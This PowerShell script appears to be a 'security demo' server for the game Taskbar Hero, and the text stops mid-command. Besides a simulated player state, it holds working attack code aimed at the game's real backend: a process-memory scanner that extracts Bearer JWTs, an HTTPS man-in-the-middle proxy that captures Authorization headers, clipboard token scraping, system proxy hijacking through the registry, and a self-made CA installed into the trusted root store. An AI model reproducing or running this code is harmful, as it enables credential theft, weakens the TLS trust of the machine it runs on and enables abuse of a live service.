# Taskbar Hero - Security Demo Server
# Usage: .\server.ps1   or  double-click start-demo.bat
# Modes: /api/vuln/*  = vulnerable (no validation)
#        /api/fixed/* = protected (server-authoritative)
#        /api/proxy/* = forward to real backend (requires X-Real-Token header)
param([int]$Port = 8080)

$scriptDir = Split-Path $MyInvocation.MyCommand.Path
$htmlFile  = Join-Path $scriptDir "security-report.html"

# In-memory idempotency cache
$script:seenEvents = [System.Collections.Hashtable]::Synchronized(@{})

# Auto-captured Bearer token (from game client clipboard)
$script:capturedToken      = $null
$script:capturedAt         = $null
$script:captureMethod      = $null
$script:customProcessName  = $null   # overrides Find-GameProcess when set via /api/set-process
$script:proxyCAThumb       = $null
$script:proxySiteThumb     = $null
$script:proxyCertPath      = $null
$script:prevProxyEnable    = $null
$script:prevProxyServer    = $null

# Player state simulation
$script:playerState = @{
  userId = "demo_player_001"; gold = 5000; level = 47; class = "Knight"
  hp = @{ current = 580; max = 580 }
  equipped = @{
    weapon    = @{ itemId="WPN_KNT_COM_001"; name="Iron Sword";  rarity="Common";   slot="weapon"; atk=12; def=0;  hp=0; durability=100; durMax=100 }
    armor     = @{ itemId="ARM_KNT_UNC_001"; name="Chain Armor"; rarity="Uncommon"; slot="armor";  atk=0;  def=35; hp=0; durability=87;  durMax=100 }
    boots     = $null; helmet = $null; gloves = $null; accessory = $null
  }
  inventory = @(
    @{ itemId="WPN_KNT_EPC_001"; name="Guardian Sword"; rarity="Epic";   qty=1;  durability=100; durMax=100 }
    @{ itemId="CON_ALL_COM_001"; name="Haste Potion";   rarity="Common"; qty=12; durability=100; durMax=100 }
  )
}

$script:RARITY_ORDER = @{ Common=0; Uncommon=1; Rare=2; Epic=3; Legendary=4 }

# Real backend endpoints
$REAL_BACKEND = "https://game.thebackend.io"
$REAL_AWS     = "https://50librtl78.execute-api.ap-northeast-2.amazonaws.com/prod"

# ---- ITEM_DB (mirrors JS ITEM_DB exactly) -----------------------------------
$script:ITEM_DB = @{
  # KNIGHT weapons
  "WPN_KNT_COM_001" = @{ name="Iron Sword";       cls="Knight"; slot="weapon";    atk=12;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_COM_002" = @{ name="Steel Sword";       cls="Knight"; slot="weapon";    atk=22;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_UNC_001" = @{ name="Tempered Blade";    cls="Knight"; slot="weapon";    atk=32;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_RAR_001" = @{ name="Silver Blade";      cls="Knight"; slot="weapon";    atk=45;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_RAR_002" = @{ name="Holy Sword";        cls="Knight"; slot="weapon";    atk=55;  def=5;   hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_EPC_001" = @{ name="Aegis Edge";        cls="Knight"; slot="weapon";    atk=88;  def=15;  hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_EPC_002" = @{ name="Paladin Blade";     cls="Knight"; slot="weapon";    atk=100; def=25;  hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_LEG_001" = @{ name="Excalibur Shard";   cls="Knight"; slot="weapon";    atk=160; def=40;  hp=0;    mgk=0;  spd=0  }
  "WPN_KNT_LEG_002" = @{ name="Paladin Oath";      cls="Knight"; slot="weapon";    atk=175; def=50;  hp=0;    mgk=0;  spd=0  }
  # KNIGHT armor
  "ARM_KNT_COM_001" = @{ name="Leather Vest";      cls="Knight"; slot="armor";     atk=0;   def=20;  hp=0;    mgk=0;  spd=0  }
  "ARM_KNT_COM_002" = @{ name="Chain Mail";        cls="Knight"; slot="armor";     atk=0;   def=35;  hp=0;    mgk=0;  spd=0  }
  "ARM_KNT_RAR_001" = @{ name="Knight Plate";      cls="Knight"; slot="armor";     atk=0;   def=55;  hp=200;  mgk=0;  spd=0  }
  "ARM_KNT_EPC_001" = @{ name="Fortress Armor";    cls="Knight"; slot="armor";     atk=0;   def=110; hp=500;  mgk=0;  spd=0  }
  "ARM_KNT_LEG_001" = @{ name="Divine Aegis";      cls="Knight"; slot="armor";     atk=0;   def=200; hp=1000; mgk=0;  spd=0  }
  # KNIGHT accessories
  "ACC_KNT_COM_001" = @{ name="Iron Buckler";      cls="Knight"; slot="accessory"; atk=0;   def=10;  hp=0;    mgk=0;  spd=0  }
  "ACC_KNT_RAR_001" = @{ name="Steel Shield";      cls="Knight"; slot="accessory"; atk=0;   def=40;  hp=100;  mgk=0;  spd=0  }
  "ACC_KNT_EPC_001" = @{ name="Shield of Faith";   cls="Knight"; slot="accessory"; atk=0;   def=80;  hp=300;  mgk=0;  spd=0  }
  # WIZARD weapons
  "WPN_WIZ_COM_001" = @{ name="Oak Staff";         cls="Wizard"; slot="weapon";    atk=10;  def=0;   hp=0;    mgk=5;  spd=0  }
  "WPN_WIZ_COM_002" = @{ name="Apprentice Wand";   cls="Wizard"; slot="weapon";    atk=15;  def=0;   hp=0;    mgk=10; spd=0  }
  "WPN_WIZ_RAR_001" = @{ name="Crystal Wand";      cls="Wizard"; slot="weapon";    atk=35;  def=0;   hp=0;    mgk=30; spd=0  }
  "WPN_WIZ_RAR_002" = @{ name="Moon Staff";        cls="Wizard"; slot="weapon";    atk=45;  def=0;   hp=0;    mgk=40; spd=0  }
  "WPN_WIZ_EPC_001" = @{ name="Arcane Tome";       cls="Wizard"; slot="weapon";    atk=70;  def=0;   hp=0;    mgk=80; spd=0  }
  "WPN_WIZ_EPC_002" = @{ name="Mana Prism";        cls="Wizard"; slot="weapon";    atk=85;  def=0;   hp=0;    mgk=100;spd=0  }
  "WPN_WIZ_LEG_001" = @{ name="Staff of Eternity"; cls="Wizard"; slot="weapon";    atk=130; def=0;   hp=0;    mgk=200;spd=0  }
  "WPN_WIZ_LEG_002" = @{ name="Void Scepter";      cls="Wizard"; slot="weapon";    atk=150; def=0;   hp=0;    mgk=250;spd=0  }
  # WIZARD armor
  "ARM_WIZ_COM_001" = @{ name="Apprentice Robe";   cls="Wizard"; slot="armor";     atk=0;   def=10;  hp=0;    mgk=0;  spd=0  }
  "ARM_WIZ_RAR_001" = @{ name="Mage Cloak";        cls="Wizard"; slot="armor";     atk=0;   def=25;  hp=0;    mgk=0;  spd=0  }
  "ARM_WIZ_EPC_001" = @{ name="Arcane Vestment";   cls="Wizard"; slot="armor";     atk=0;   def=55;  hp=0;    mgk=0;  spd=0  }
  "ARM_WIZ_LEG_001" = @{ name="Ether Mantle";      cls="Wizard"; slot="armor";     atk=0;   def=100; hp=0;    mgk=0;  spd=0  }
  # ARCHER weapons
  "WPN_ARC_COM_001" = @{ name="Wood Bow";          cls="Archer"; slot="weapon";    atk=14;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_ARC_COM_002" = @{ name="Composite Bow";     cls="Archer"; slot="weapon";    atk=24;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_ARC_RAR_001" = @{ name="Elven Bow";         cls="Archer"; slot="weapon";    atk=48;  def=0;   hp=0;    mgk=0;  spd=10 }
  "WPN_ARC_RAR_002" = @{ name="War Bow";           cls="Archer"; slot="weapon";    atk=60;  def=0;   hp=0;    mgk=0;  spd=15 }
  "WPN_ARC_EPC_001" = @{ name="Shadow Crossbow";   cls="Archer"; slot="weapon";    atk=90;  def=0;   hp=0;    mgk=0;  spd=25 }
  "WPN_ARC_EPC_002" = @{ name="Sniper Bow";        cls="Archer"; slot="weapon";    atk=105; def=0;   hp=0;    mgk=0;  spd=35 }
  "WPN_ARC_LEG_001" = @{ name="Heartseeker";       cls="Archer"; slot="weapon";    atk=155; def=0;   hp=0;    mgk=0;  spd=60 }
  "WPN_ARC_LEG_002" = @{ name="Phantom Arrow";     cls="Archer"; slot="weapon";    atk=170; def=0;   hp=0;    mgk=0;  spd=75 }
  # ARCHER armor
  "ARM_ARC_COM_001" = @{ name="Leather Tunic";     cls="Archer"; slot="armor";     atk=0;   def=15;  hp=0;    mgk=0;  spd=5  }
  "ARM_ARC_RAR_001" = @{ name="Hunters Vest";      cls="Archer"; slot="armor";     atk=0;   def=35;  hp=0;    mgk=0;  spd=20 }
  "ARM_ARC_EPC_001" = @{ name="Shadow Garb";       cls="Archer"; slot="armor";     atk=0;   def=65;  hp=0;    mgk=0;  spd=45 }
  "ARM_ARC_LEG_001" = @{ name="Phantom Mantle";    cls="Archer"; slot="armor";     atk=0;   def=120; hp=0;    mgk=0;  spd=90 }
  # SLAYER weapons
  "WPN_SLY_COM_001" = @{ name="Iron Axe";          cls="Slayer"; slot="weapon";    atk=18;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_SLY_COM_002" = @{ name="Battle Axe";        cls="Slayer"; slot="weapon";    atk=28;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_SLY_RAR_001" = @{ name="War Cleaver";       cls="Slayer"; slot="weapon";    atk=52;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_SLY_EPC_001" = @{ name="Demolisher";        cls="Slayer"; slot="weapon";    atk=95;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_SLY_EPC_002" = @{ name="Skewer Shot";       cls="Slayer"; slot="weapon";    atk=108; def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_SLY_LEG_001" = @{ name="Ragnarok Axe";      cls="Slayer"; slot="weapon";    atk=180; def=0;   hp=0;    mgk=0;  spd=0  }
  # SLAYER armor
  "ARM_SLY_RAR_001" = @{ name="Berserker Mail";    cls="Slayer"; slot="armor";     atk=0;   def=40;  hp=0;    mgk=0;  spd=0  }
  "ARM_SLY_EPC_001" = @{ name="Warlord Plate";     cls="Slayer"; slot="armor";     atk=0;   def=90;  hp=0;    mgk=0;  spd=0  }
  "ARM_SLY_LEG_001" = @{ name="Doom Mantle";       cls="Slayer"; slot="armor";     atk=0;   def=170; hp=0;    mgk=0;  spd=0  }
  # HUNTER weapons
  "WPN_HNT_COM_001" = @{ name="Hunter Knife";      cls="Hunter"; slot="weapon";    atk=11;  def=0;   hp=0;    mgk=0;  spd=8  }
  "WPN_HNT_COM_002" = @{ name="Twin Daggers";      cls="Hunter"; slot="weapon";    atk=18;  def=0;   hp=0;    mgk=0;  spd=12 }
  "WPN_HNT_RAR_001" = @{ name="Venomfang";         cls="Hunter"; slot="weapon";    atk=42;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_HNT_EPC_001" = @{ name="Shadow Blade";      cls="Hunter"; slot="weapon";    atk=80;  def=0;   hp=0;    mgk=0;  spd=30 }
  "WPN_HNT_EPC_002" = @{ name="Frost Bolt";        cls="Hunter"; slot="weapon";    atk=75;  def=0;   hp=0;    mgk=0;  spd=0  }
  "WPN_HNT_LEG_001" = @{ name="Phantom Blade";     cls="Hunter"; slot="weapon";    atk=148; def=0;   hp=0;    mgk=0;  spd=50 }
  # HUNTER armor
  "ARM_HNT_RAR_001" = @{ name="Scout Garb";        cls="Hunter"; slot="armor";     atk=0;   def=30;  hp=0;    mgk=0;  spd=25 }
  "ARM_HNT_EPC_001" = @{ name="Assassin Cloak";    cls="Hunter"; slot="armor";     atk=0;   def=60;  hp=0;    mgk=0;  spd=55 }
  "ARM_HNT_LEG_001" = @{ name="Ghost Veil";        cls="Hunter"; slot="armor";     atk=0;   def=115; hp=0;    mgk=0;  spd=100}
  # PRIEST weapons
  "WPN_PRS_COM_001" = @{ name="Holy Rod";          cls="Priest"; slot="weapon";    atk=8;   def=0;   hp=0;    mgk=15; spd=0  }
  "WPN_PRS_COM_002" = @{ name="Healing Staff";     cls="Priest"; slot="weapon";    atk=12;  def=0;   hp=0;    mgk=25; spd=0  }
  "WPN_PRS_RAR_001" = @{ name="Blessed Scepter";   cls="Priest"; slot="weapon";    atk=35;  def=0;   hp=0;    mgk=60; spd=0  }
  "WPN_PRS_EPC_001" = @{ name="Divine Scepter";    cls="Priest"; slot="weapon";    atk=60;  def=0;   hp=0;    mgk=90; spd=0  }
  "WPN_PRS_EPC_002" = @{ name="Prophets Tome";     cls="Priest"; slot="weapon";    atk=75;  def=0;   hp=0;    mgk=110;spd=0  }
  "WPN_PRS_LEG_001" = @{ name="Angels Grace";      cls="Priest"; slot="weapon";    atk=110; def=0;   hp=0;    mgk=200;spd=0  }
  # PRIEST armor
  "ARM_PRS_COM_001" = @{ name="Acolyte Robe";      cls="Priest"; slot="armor";     atk=0;   def=12;  hp=0;    mgk=0;  spd=0  }
  "ARM_PRS_RAR_001" = @{ name="Cleric Mantle";     cls="Priest"; slot="armor";     atk=0;   def=30;  hp=0;    mgk=0;  spd=0  }
  "ARM_PRS_EPC_001" = @{ name="Bishop Vestment";   cls="Priest"; slot="armor";     atk=0;   def=65;  hp=0;    mgk=0;  spd=0  }
  "ARM_PRS_LEG_001" = @{ name="Holy Shroud";       cls="Priest"; slot="armor";     atk=0;   def=125; hp=0;    mgk=0;  spd=0  }
  # Shared accessories
  "ACC_ALL_COM_001" = @{ name="Copper Ring";        cls="All";    slot="accessory"; atk=5;   def=0;   hp=0;    mgk=0;  spd=0  }
  "ACC_ALL_COM_002" = @{ name="Silver Pendant";     cls="All";    slot="accessory"; atk=0;   def=5;   hp=0;    mgk=0;  spd=0  }
  "ACC_ALL_RAR_001" = @{ name="Ring of Vitality";   cls="All";    slot="accessory"; atk=0;   def=0;   hp=100;  mgk=0;  spd=0  }
  "ACC_ALL_RAR_002" = @{ name="Mage Seal";          cls="All";    slot="accessory"; atk=0;   def=0;   hp=0;    mgk=10; spd=0  }
  "ACC_ALL_RAR_003" = @{ name="Speed Ring";         cls="All";    slot="accessory"; atk=0;   def=0;   hp=0;    mgk=0;  spd=15 }
  "ACC_ALL_EPC_001" = @{ name="Amulet of Power";    cls="All";    slot="accessory"; atk=30;  def=50;  hp=0;    mgk=0;  spd=0  }
  "ACC_ALL_EPC_002" = @{ name="Dragon Pendant";     cls="All";    slot="accessory"; atk=50;  def=0;   hp=200;  mgk=0;  spd=0  }
  "ACC_ALL_LEG_001" = @{ name="Orb of Eternity";    cls="All";    slot="accessory"; atk=80;  def=100; hp=500;  mgk=0;  spd=0  }
}

$script:CHEST_MAP = @{
  "zone_1" = @{ "wood_chest"="zone1_common"; "gold_chest"="zone1_rare"   }
  "zone_2" = @{ "wood_chest"="zone2_common"; "gold_chest"="zone2_epic"   }
  "zone_3" = @{ "wood_chest"="zone3_epic";   "gold_chest"="zone3_legend" }
  "boss"   = @{ "reward"="boss_drop" }
}

$script:DROP_TABLE = @{
  "zone1_common" = @{ itemId="WPN_KNT_COM_001"; name="Iron Sword";      rarity="Common"    }
  "zone1_rare"   = @{ itemId="WPN_KNT_RAR_001"; name="Silver Blade";    rarity="Rare"      }
  "zone2_common" = @{ itemId="WPN_ARC_COM_001"; name="Wood Bow";        rarity="Common"    }
  "zone2_epic"   = @{ itemId="WPN_ARC_EPC_001"; name="Shadow Crossbow"; rarity="Epic"      }
  "zone3_epic"   = @{ itemId="WPN_WIZ_EPC_001"; name="Arcane Tome";     rarity="Epic"      }
  "zone3_legend" = @{ itemId="WPN_WIZ_LEG_001"; name="Staff of Eternity";rarity="Legendary"}
  "boss_drop"    = @{ itemId="WPN_KNT_EPC_001"; name="Aegis Edge";      rarity="Epic"      }
}

$script:USER = @{ baseHp=300; level=15; hpPerLevel=12; equipBonus=5 }

# ---- MemSearch (P/Invoke memory scanner) ------------------------------------
if (-not ([System.Management.Automation.PSTypeName]'MemSearch').Type) {
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;

[StructLayout(LayoutKind.Explicit, Size=48)]
public struct MEMORY_BASIC_INFORMATION {
    [FieldOffset(0)]  public IntPtr BaseAddress;
    [FieldOffset(8)]  public IntPtr AllocationBase;
    [FieldOffset(16)] public uint AllocationProtect;
    [FieldOffset(24)] public IntPtr RegionSize;
    [FieldOffset(32)] public uint State;
    [FieldOffset(36)] public uint Protect;
    [FieldOffset(40)] public uint Type;
}

public static class MemSearch {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint acc, bool inh, int pid);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern int VirtualQueryEx(IntPtr hP, IntPtr addr,
        out MEMORY_BASIC_INFORMATION mbi, int size);
    [DllImport("kernel32.dll")] static extern bool ReadProcessMemory(IntPtr hP, IntPtr addr,
        byte[] buf, int n, out int read);

    static int Find(byte[] hay, int len, byte[] needle) {
        for (int i = 0; i <= len - needle.Length; i++) {
            bool ok = true;
            for (int j = 0; j < needle.Length; j++) {
                if (hay[i + j] != needle[j]) { ok = false; break; }
            }
            if (ok) return i;
        }
        return -1;
    }

    static bool IsJwtChar(byte b) {
        return (b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') ||
               (b >= '0' && b <= '9') || b == '.' || b == '-' || b == '_' ||
               b == '=' || b == '+' || b == '/';
    }

    // Extract ASCII/UTF-8 token from buf[fx..] — returns "Bearer eyJ..." or null
    static string ExtractAscii(byte[] buf, int nR, int fx, string prefix) {
        int end = fx + prefix.Length;
        while (end < nR && IsJwtChar(buf[end])) end++;
        if (end - fx < prefix.Length + 20) return null;
        string s = Encoding.ASCII.GetString(buf, fx, end - fx);
        int dots = 0; foreach (char c in s) if (c == '.') dots++;
        return dots >= 2 ? s : null;
    }

    // Extract UTF-16 LE token — .NET strings are always UTF-16 in managed heap
    static string ExtractUtf16(byte[] buf, int nR, int fx, string prefix) {
        var sb = new StringBuilder(prefix);
        int pos = fx + prefix.Length * 2;
        while (pos + 1 < nR) {
            char c = (char)(buf[pos] | (buf[pos + 1] << 8));
            if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
                  c == '.' || c == '-' || c == '_' || c == '=' || c == '+' || c == '/')) break;
            sb.Append(c);
            pos += 2;
        }
        if (sb.Length < prefix.Length + 20) return null;
        string s = sb.ToString();
        int dots = 0; foreach (char c in s) if (c == '.') dots++;
        return dots >= 2 ? s : null;
    }

    public static string FindBearer(int pid) {
        IntPtr hP = OpenProcess(0x0410, false, pid);
        if (hP == IntPtr.Zero) return null;
        try {
            // All four patterns: UTF-8 and UTF-16 for "Bearer eyJ" and bare "eyJ"
            byte[] n8full  = Encoding.UTF8.GetBytes("Bearer eyJ");
            byte[] n8bare  = Encoding.UTF8.GetBytes("eyJ");
            byte[] n16full = Encoding.Unicode.GetBytes("Bearer eyJ");
            byte[] n16bare = Encoding.Unicode.GetBytes("eyJ");

            byte[] buf  = new byte[524288];
            IntPtr addr = IntPtr.Zero;
            int mbiSz   = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
            MEMORY_BASIC_INFORMATION mbi;

            while (VirtualQueryEx(hP, addr, out mbi, mbiSz) != 0) {
                long rSz = mbi.RegionSize.ToInt64();
                try { addr = new IntPtr(mbi.BaseAddress.ToInt64() + rSz); } catch { break; }
                if (addr.ToInt64() <= 0) break;
                if (mbi.State != 0x1000) continue;
                if ((mbi.Protect & 0x66) == 0) continue;
                if ((mbi.Protect & 0x100) != 0) continue;
                if (rSz > 67108864) continue;

                long rem = rSz, off = 0;
                while (rem > 0) {
                    int toR = (int)Math.Min(rem, 524288L);
                    int nR; string t;
                    IntPtr rAddr = new IntPtr(mbi.BaseAddress.ToInt64() + off);
                    if (ReadProcessMemory(hP, rAddr, buf, toR, out nR) && nR > 0) {
                        int fx;
                        // 1) UTF-16 "Bearer eyJ" — most likely for .NET/Unity managed strings
                        fx = Find(buf, nR, n16full);
                        if (fx >= 0) { t = ExtractUtf16(buf, nR, fx, "Bearer eyJ"); if (t != null) return t; }
                        // 2) UTF-8 "Bearer eyJ" — HTTP wire buffer, WebRequest headers
                        fx = Find(buf, nR, n8full);
                        if (fx >= 0) { t = ExtractAscii(buf, nR, fx, "Bearer eyJ"); if (t != null) return t; }
                        // 3) UTF-16 bare "eyJ" — token stored without prefix
                        fx = Find(buf, nR, n16bare);
                        if (fx >= 0) { t = ExtractUtf16(buf, nR, fx, "eyJ"); if (t != null) return "Bearer " + t; }
                        // 4) UTF-8 bare "eyJ" — fallback
                        fx = Find(buf, nR, n8bare);
                        if (fx >= 0) { t = ExtractAscii(buf, nR, fx, "eyJ"); if (t != null) return "Bearer " + t; }
                    }
                    off += toR; rem -= toR;
                }
            }
            return null;
        } finally { CloseHandle(hP); }
    }
}
'@
}

# ---- HttpsProxy (HTTPS MITM interceptor) ------------------------------------
if (-not ([System.Management.Automation.PSTypeName]'HttpsProxy').Type) {
  Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

public static class HttpsProxy {
    public static volatile string CapturedToken = null;
    public static volatile string CapturedAt    = null;
    public static volatile bool   IsRunning     = false;
    public static int             RequestCount  = 0;   // accessed via Interlocked, not volatile

    static TcpListener      _listener;
    static X509Certificate2 _cert;

    static readonly string[] _hosts = new[] { "thebackend.io", "amazonaws.com" };

    public static void Start(int port, string certPath, string certPass) {
        _cert     = new X509Certificate2(certPath, certPass,
                        X509KeyStorageFlags.MachineKeySet | X509KeyStorageFlags.PersistKeySet);
        IsRunning = true;
        _listener = new TcpListener(IPAddress.Loopback, port);
        _listener.Start();
        new Thread(AcceptLoop) { IsBackground = true, Name = "HttpsProxy" }.Start();
    }

    public static void Stop() {
        IsRunning = false;
        try { _listener.Stop(); } catch {}
    }

    static void AcceptLoop() {
        while (IsRunning) {
            try {
                TcpClient client = _listener.AcceptTcpClient();
                new Thread(() => { try { Handle(client); } catch {} finally { try { client.Close(); } catch {} } })
                    { IsBackground = true }.Start();
            } catch {}
        }
    }

    static string ReadHeaderLine(Stream s) {
        var sb = new StringBuilder(256);
        int b;
        while ((b = s.ReadByte()) != -1) {
            if (b == '\n') break;
            if (b != '\r') sb.Append((char)b);
        }
        return sb.ToString();
    }

    static bool ShouldMitm(string host) {
        foreach (string h in _hosts)
            if (host.EndsWith(h, StringComparison.OrdinalIgnoreCase)) return true;
        return false;
    }

    static void Handle(TcpClient client) {
        Stream ns = client.GetStream();
        string req = ReadHeaderLine(ns);
        if (string.IsNullOrEmpty(req)) return;

        string host = ""; int port = 443;
        var m = Regex.Match(req, @"^CONNECT\s+([^:]+):(\d+)", RegexOptions.IgnoreCase);
        if (m.Success) {
            host = m.Groups[1].Value;
            int.TryParse(m.Groups[2].Value, out port);
            while (ReadHeaderLine(ns).Length > 0) {}
        }

        byte[] ok200 = Encoding.ASCII.GetBytes("HTTP/1.1 200 Connection established\r\n\r\n");
        ns.Write(ok200, 0, ok200.Length);

        if (!ShouldMitm(host)) {
            // Blind tunnel
            try {
                var up = new TcpClient(host, port);
                var t1 = new Thread(() => Pipe(ns, up.GetStream())) { IsBackground = true };
                var t2 = new Thread(() => Pipe(up.GetStream(), ns)) { IsBackground = true };
                t1.Start(); t2.Start(); t1.Join(); t2.Join();
                up.Close();
            } catch {}
            return;
        }

        // SSL MITM
        SslStream cSsl = null; SslStream sSsl = null;
        try {
            cSsl = new SslStream(ns, true);
            cSsl.AuthenticateAsServer(_cert, false, SslProtocols.Tls12 | SslProtocols.Tls11, false);

            var realTcp = new TcpClient(host, port);
            sSsl = new SslStream(realTcp.GetStream(), true, (s, c, ch, e) => true);
            sSsl.AuthenticateAsClient(host);

            var t1 = new Thread(() => RelayCapture(cSsl, sSsl)) { IsBackground = true };
            var t2 = new Thread(() => Pipe(sSsl, cSsl))          { IsBackground = true };
            t1.Start(); t2.Start(); t1.Join(); t2.Join();
        } finally {
            try { if (cSsl != null) cSsl.Close(); } catch {}
            try { if (sSsl != null) sSsl.Close(); } catch {}
        }
    }

    static void RelayCapture(Stream src, Stream dst) {
        byte[] buf    = new byte[65536];
        byte[] needle = Encoding.ASCII.GetBytes("Authorization: Bearer ");
        try {
            int n;
            while ((n = src.Read(buf, 0, buf.Length)) > 0) {
                // Scan for Authorization header
                for (int i = 0; i <= n - needle.Length; i++) {
                    bool hit = true;
                    for (int j = 0; j < needle.Length; j++)
                        if (buf[i + j] != needle[j]) { hit = false; break; }
                    if (hit) {
                        int s = i + needle.Length, e = s;
                        while (e < n && buf[e] != '\r' && buf[e] != '\n') e++;
                        if (e > s + 10) {
                            CapturedToken = "Bearer " + Encoding.ASCII.GetString(buf, s, e - s);
                            CapturedAt    = DateTime.Now.ToString("HH:mm:ss");
                            Interlocked.Increment(ref RequestCount);
                        }
                        break;
                    }
                }
                dst.Write(buf, 0, n);
                dst.Flush();
            }
        } catch {}
        try { dst.Close(); } catch {}
    }

    static void Pipe(Stream src, Stream dst) {
        byte[] buf = new byte[65536];
        try { int n; while ((n = src.Read(buf, 0, buf.Length)) > 0) { dst.Write(buf, 0, n); dst.Flush(); } } catch {}
        try { dst.Close(); } catch {}
    }
}
'@
}

# ---- Helpers ----------------------------------------------------------------
function Send-Json {
  param($res, $obj, [int]$code = 200)
  $json  = $obj | ConvertTo-Json -Depth 10
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
  $res.StatusCode      = $code
  $res.ContentType     = "application/json; charset=utf-8"
  $res.ContentLength64 = $bytes.Length
  $res.OutputStream.Write($bytes, 0, $bytes.Length)
  $res.Close()
}

function Send-Html {
  param($res, [string]$html)
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
  $res.StatusCode      = 200
  $res.ContentType     = "text/html; charset=utf-8"
  $res.ContentLength64 = $bytes.Length
  $res.OutputStream.Write($bytes, 0, $bytes.Length)
  $res.Close()
}

function Read-Body {
  param($req)
  if (-not $req.HasEntityBody) { return $null }
  $sr  = [System.IO.StreamReader]::new($req.InputStream, [System.Text.Encoding]::UTF8)
  $raw = $sr.ReadToEnd()
  $sr.Dispose()
  try { return $raw | ConvertFrom-Json } catch { return $null }
}

function Add-Cors { param($res)
  $res.Headers.Set("Access-Control-Allow-Origin",  "*")
  $res.Headers.Set("Access-Control-Allow-Methods", "GET,POST,PATCH,PUT,DELETE,OPTIONS")
  $res.Headers.Set("Access-Control-Allow-Headers", "Content-Type,Authorization,X-Real-Token,X-Mode")
}

function Get-TokenFromClipboard {
  try {
    # Get-Clipboard requires STA apartment; spawn a dedicated STA runspace
    $rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
    $rs.ApartmentState = [System.Threading.ApartmentState]::STA
    $rs.Open()
    $ps = [System.Management.Automation.PowerShell]::Create()
    $ps.Runspace = $rs
    $null = $ps.AddScript('Get-Clipboard -Raw')
    $clip = "$($ps.Invoke() | Select-Object -First 1)"
    $ps.Dispose(); $rs.Close()
    if ($clip -match "(Bearer\s+eyJ[\w\-\.\+\/=]+)") {
      return $Matches[1].Trim()
    }
  } catch {}
  return $null
}

function Set-SystemProxy {
  param([bool]$Enable, [int]$Port = 8081)
  $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
  if ($Enable) {
    $script:prevProxyEnable = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).ProxyEnable
    $script:prevProxyServer = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).ProxyServer
    Set-ItemProperty -Path $regPath -Name ProxyEnable   -Value 1 -Type DWord -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $regPath -Name ProxyServer   -Value "127.0.0.1:$Port" -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $regPath -Name ProxyOverride -Value "<local>" -ErrorAction SilentlyContinue
    & netsh winhttp set proxy "127.0.0.1:$Port" "<local>" 2>$null | Out-Null
    Write-Host "  [PROXY] System proxy -> 127.0.0.1:$Port" -ForegroundColor Green
  } else {
    $prev = if ($null -ne $script:prevProxyEnable) { $script:prevProxyEnable } else { 0 }
    Set-ItemProperty -Path $regPath -Name ProxyEnable -Value $prev -Type DWord -ErrorAction SilentlyContinue
    if ($script:prevProxyServer) {
      Set-ItemProperty -Path $regPath -Name ProxyServer -Value $script:prevProxyServer -ErrorAction SilentlyContinue
    } else {
      Remove-ItemProperty -Path $regPath -Name ProxyServer -ErrorAction SilentlyContinue
    }
    & netsh winhttp reset proxy 2>$null | Out-Null
    Write-Host "  [PROXY] System proxy restored" -ForegroundColor Yellow
  }
}

function Start-HttpsInterceptor {
  param(
    [int]$ProxyPort = 8081,
    [string]$PrebuiltPfxPath = "",
    [string]$PrebuiltPfxPass = "",
    [string]$PrebuiltCAThumb = ""
  )
  if ([HttpsProxy]::IsRunning) { return @{ ok=$true; msg="already running" } }
  try {
    $pfxPass = if ($PrebuiltPfxPass) { $PrebuiltPfxPass } else { "thbdemo2025!" }
    $pfxPath = $PrebuiltPfxPath

    if (-not $pfxPath -or -not (Test-Path $pfxPath)) {
      Write-Host "  [PROXY] Generating certificates..." -ForegroundColor Cyan
      Import-Module PKI -ErrorAction SilentlyContinue

      # CA cert
      $ca = New-SelfSignedCertificate `
        -Subject "CN=THB Security Demo CA" `
        -KeyUsage CertSign,CRLSign `
        -KeyExportPolicy Exportable `
        -NotAfter (Get-Date).AddYears(1) `
        -CertStoreLocation "Cert:\CurrentUser\My" `
        -HashAlgorithm SHA256 `
        -ErrorAction Stop
      $script:proxyCAThumb = $ca.Thumbprint

      # Install CA to trusted roots
      $rootStore = [System.Security.Cryptography.X509Certificates.X509Store]::new("Root", "CurrentUser")
      $rootStore.Open("ReadWrite")
      $rootStore.Add($ca)
      $rootStore.Close()
      Write-Host "  [PROXY] CA installed: $($ca.Thumbprint)" -ForegroundColor Green

      # Site cert signed by CA
      $site = New-SelfSignedCertificate `
        -Subject "CN=game.thebackend.io" `
        -DnsName @("game.thebackend.io", "*.thebackend.io") `
        -Signer $ca `
        -KeyExportPolicy Exportable `
        -NotAfter (Get-Date).AddYears(1) `
        -CertStoreLocation "Cert:\CurrentUser\My" `
